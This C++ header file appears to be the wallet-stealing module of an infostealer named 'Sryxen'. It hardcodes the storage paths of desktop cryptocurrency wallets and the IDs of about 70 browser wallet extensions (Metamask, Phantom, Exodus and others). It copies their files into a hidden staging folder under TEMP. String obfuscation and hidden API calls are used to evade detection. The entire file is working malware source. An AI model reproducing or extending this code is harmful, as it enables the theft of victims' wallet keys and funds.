#ifndef WALLETS_HPP
#define WALLETS_HPP

#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <filesystem>
#include "winapi_structs.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

namespace Wallets {
    const char* appData = std::getenv("APPDATA");
    const char* localAppData = std::getenv("LOCALAPPDATA");

    const std::map<std::string, std::string> walletPaths = {
        {OBF("Armory"), std::string(appData) + "\\" + OBF("Armory")},
        {OBF("Atomic"), std::string(appData) + "\\" + OBF("Atomic\\Local Storage\\leveldb")},
        {OBF("Bitcoin"), std::string(appData) + "\\" + OBF("Bitcoin\\wallets")},
        {OBF("Bytecoin"), std::string(appData) + "\\" + OBF("bytecoin")},
        {OBF("Coinomi"), std::string(localAppData) + "\\" + OBF("Coinomi\\Coinomi\\wallets")},
        {OBF("Dash"), std::string(appData) + "\\" + OBF("DashCore\\wallets")},
        {OBF("Electrum"), std::string(appData) + "\\" + OBF("Electrum\\wallets")},
        {OBF("Ethereum"), std::string(appData) + "\\" + OBF("Ethereum\\keystore")},
        {OBF("Exodus"), std::string(appData) + "\\" + OBF("Exodus\\exodus.wallet")},
        {OBF("Guarda"), std::string(appData) + "\\" + OBF("Guarda\\Local Storage\\leveldb")},
        {OBF("Jaxx"), std::string(appData) + "\\" + OBF("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb")},
        {OBF("Litecoin"), std::string(appData) + "\\" + OBF("Litecoin\\wallets")},
        {OBF("MyMonero"), std::string(appData) + "\\" + OBF("MyMonero")},
        {OBF("Monero"), std::string(appData) + "\\" + OBF("Monero")},
        {OBF("Zcash"), std::string(appData) + "\\" + OBF("Zcash")}
    };


    std::map<std::string, std::string> walletExtensions = {
        {OBF("dlcobpjiigpikoobohmabehhmhfoodbb"), OBF("Argent X")},
        {OBF("jiidiaalihmmhddjgbnbgdfflelocpak"), OBF("BitKeep Wallet")},
        {OBF("bopcbmipnjdcdfflfgjdgdjejmgpoaab"), OBF("BlockWallet")},
        {OBF("odbfpeeihdkbihmopkbjmoonfanlbfcl"), OBF("Coinbase")},
        {OBF("hifafgmccdpekplomjjkcfgodnhcellj"), OBF("Crypto.com")},
        {OBF("kkpllkodjeloidieedojogacfhpaihoh"), OBF("Enkrypt")},
        {OBF("mcbigmjiafegjnnogedioegffbooigli"), OBF("Ethos Sui")},
        {OBF("aholpfdialjgjfhomihkjbmgjidlcdno"), OBF("ExodusWeb3")},
        {OBF("hpglfhgfnhbgpjdenjgmdgoeiappafln"), OBF("Guarda")},
        {OBF("afbcbjpbpfadlkmhmclhkeeodmamcflc"), OBF("MathWallet")},
        {OBF("mcohilncbfahbmgdjkbpemcciiolgcge"), OBF("OKX")},
        {OBF("jnmbobjmhlngoefaiojfljckilhhlhcj"), OBF("OneKey")},
        {OBF("fnjhmkhhmkbjkkabndcnnogagogbneec"), OBF("Ronin")},
        {OBF("lgmpcpglpngdoalbgeoldeajfclnhafa"), OBF("SafePal")},
        {OBF("mfgccjchihfkkindfppnaooecgfneiii"), OBF("TokenPocket")},
        {OBF("nphplpgoakhhjchkkhmiggakijnkhfnd"), OBF("Ton")},
        {OBF("amkmjjmmflddogmhpjloimipbofnfjih"), OBF("Wombat")},
        {OBF("heamnjbnflcikcggoiplibfommfbkjpj"), OBF("Zeal")},
        {OBF("jagohholfbnaombfgmademhogekljklp"), OBF("Binance Smart Chain")},
        {OBF("bhghoamapcdpbohphigoooaddinpkbai"), OBF("Authenticator")},
        {OBF("fhbohimaelbohpjbbldcngcnapndodjp"), OBF("Binance")},
        {OBF("fihkakfobkmkjojpchpfgcmhfjnmnfpi"), OBF("Bitapp")},
        {OBF("aodkkagnadcbobfpggfnjeongemjbjca"), OBF("BoltX")},
        {OBF("aeachknmefphepccionboohckonoeemg"), OBF("Coin98")},
        {OBF("hnfanknocfeofbddgcijnmhnfnkdnaad"), OBF("Coinbase")},
        {OBF("agoakfejjabomempkjlepdflaleeobhb"), OBF("Core")},
        {OBF("pnlfjmlcjdjgkddecgincndfgegkecke"), OBF("Crocobit")},
        {OBF("blnieiiffboillknjnepogjhkgnoapac"), OBF("Equal")},
        {OBF("cgeeodpfagjceefieflmdfphplkenlfk"), OBF("Ever")},
        {OBF("ebfidpplhabeedpnhjnobghokpiioolj"), OBF("Fewcha")},
        {OBF("cjmkndjhnagcfbpiemnkdpomccnjblmj"), OBF("Finnie")},
        {OBF("nanjmdknhkinifnkgdcggcfnhdaammmj"), OBF("Guild")},
        {OBF("fnnegphlobjdpkhecapkijjdkgcjhkib"), OBF("HarmonyOutdated")},
        {OBF("flpiciilemghbmfalicajoolhkkenfel"), OBF("Iconex")},
        {OBF("cjelfplplebdjjenllpjcblmjkfcffne"), OBF("Jaxx Liberty")},
        {OBF("jblndlipeogpafnldhgmapagcccfchpi"), OBF("Kaikas")},
        {OBF("pdadjkfkgcafgbceimcpbkalnfnepbnk"), OBF("KardiaChain")},
        {OBF("dmkamcknogkgcdfhhbddcghachkejeap"), OBF("Keplr")},
        {OBF("kpfopkelmapcoipemfendmdcghnegimn"), OBF("Liquality")},
        {OBF("nlbmnnijcnlegkjjpcfjclmcfggfefdm"), OBF("MEWCX")},
        {OBF("dngmlblcodfobpdpecaadgfbcggfjfnm"), OBF("MaiarDEFI")},
        {OBF("efbglgofoippbgcjepnhiblaibcnclgk"), OBF("Martian")},
        {OBF("nkbihfbeogaeaoehlefnkodbefgpgknn"), OBF("Metamask")},
        {OBF("ejbalbakoplchlghecdalmeeeajnimhm"), OBF("Metamask2")},
        {OBF("fcckkdbjnoikooededlapcalpionmalo"), OBF("Mobox")},
        {OBF("lpfcbjknijpeeillifnkikgncikgfhdo"), OBF("Nami")},
        {OBF("jbdaocneiiinmjbjlgalhcelgbejmnid"), OBF("Nifty")},
        {OBF("fhilaheimglignddkjgofkcbgekhenbh"), OBF("Oxygen")},
        {OBF("mgffkfbidihjpoaomajlbgchddlicgpn"), OBF("PaliWallet")},
        {OBF("ejjladinnckdgjemekebdpeokbikhfci"), OBF("Petra")},
        {OBF("bfnaelmomeimhlpmgjnjophhpkkoljpa"), OBF("Phantom")},
        {OBF("phkbamefinggmakgklpkljjmgibohnba"), OBF("Pontem")},
        {OBF("nkddgncdjgjfcddamfgcmfnlhccnimig"), OBF("Saturn")},
        {OBF("pocmplpaccanhmnllbbkpgfliimjljgo"), OBF("Slope")},
        {OBF("bhhhlbepdkbapadjdnnojkbgioiodbic"), OBF("Solfare")},
        {OBF("fhmfendgdocmcbmfikdcogofphimnkno"), OBF("Sollet")},
        {OBF("mfhbebgoclkghebffdldpobeajmbecfk"), OBF("Starcoin")},
        {OBF("cmndjbecilbocjfkibfbifhngkdmjgog"), OBF("Swash")},
        {OBF("ookjlbkiijinhpmnjffcofjonbfbgaoc"), OBF("TempleTezos")},
        {OBF("aiifbnbfobpmeekipheeijimdpnlpgpp"), OBF("TerraStation")},
        {OBF("ibnejdfjmmkpcnlpebklmnkoeoihofec"), OBF("Tron")},
        {OBF("egjidjbpglichdcondbcbdnbeeppgdph"), OBF("Trust Wallet")},
        {OBF("hmeobnfnfcmdkdcmlblgagmfpfboieaf"), OBF("XDEFI")},
        {OBF("eigblbgjknlfbajkfhopmcojidlgcehm"), OBF("XMR.PT")},
        {OBF("bocpokimicclpaiekenaeelehdjllofo"), OBF("XinPay")},
        {OBF("ffnbelfdoeiohenkjibnmadjiehjhajb"), OBF("Yoroi")},
        {OBF("kncchdigobghenbbaddojjnnaogfppfj"), OBF("iWallet")},
        {OBF("epapihdplajcdnnkdeiahlgigofloibg"), OBF("Sender")}
    };

    inline void ExtractDesktopWallets(const std::string& baseDir) {
        std::string walletDir = baseDir + OBF("\\Cryptowallets");
        HiddenCalls::CreateDirectoryA(walletDir.c_str(), NULL);

        for (const auto& wallet : walletPaths) {
            const std::string& name = wallet.first;
            const std::string& path = wallet.second;

            if (fs::exists(path)) {
                std::string destPath = walletDir + "\\" + name;
                HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);

                for (const auto& file : fs::directory_iterator(path)) {
                    std::string fileDest = destPath + "\\" + file.path().filename().string();
                    HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
                }
            }
        }
    }

    inline void ExtractBrowserWallets(const std::string& baseDir) {
        std::string walletExtDir = baseDir + OBF("\\Cryptowallets\\Extensions");
        HiddenCalls::CreateDirectoryA(walletExtDir.c_str(), NULL);

        static auto chromiumBrowsers = Paths::ChromiumPaths(); // Getting all Chromium Browsers

        if (chromiumBrowsers.empty()) {
            return;
        }

        for (const auto& browser : chromiumBrowsers) {
            fs::path browserBasePath = browser.browserRoot;
            fs::path extDir = browserBasePath / OBF("Local Extension Settings");

            if (!fs::exists(extDir)) {
                continue;
            }

            for (const auto& walletExt : walletExtensions) {
                const std::string& extID = walletExt.first;
                const std::string& name = walletExt.second;
                fs::path walletPath = extDir / extID;

                if (fs::exists(walletPath)) {
                    std::string destPath = walletExtDir + "\\" + name;
                    HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);

                    for (const auto& file : fs::directory_iterator(walletPath)) {
                        std::string fileDest = destPath + "\\" + file.path().filename().string();
                        HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
                    }
                }
            }
        }
    }

    inline void Extract() {
        DEBUG_PRINT(L"Wallet Grabber Started");
        std::string tempDir = std::string(getenv("TEMP")).append(OBF("\\Sryxen"));
        HiddenCalls::CreateDirectoryA(tempDir.c_str(), NULL);

        ExtractDesktopWallets(tempDir);
        ExtractBrowserWallets(tempDir);
        DEBUG_PRINT(L"Wallet Grabber Finished");
    }
}

#endif // WALLETS_HPP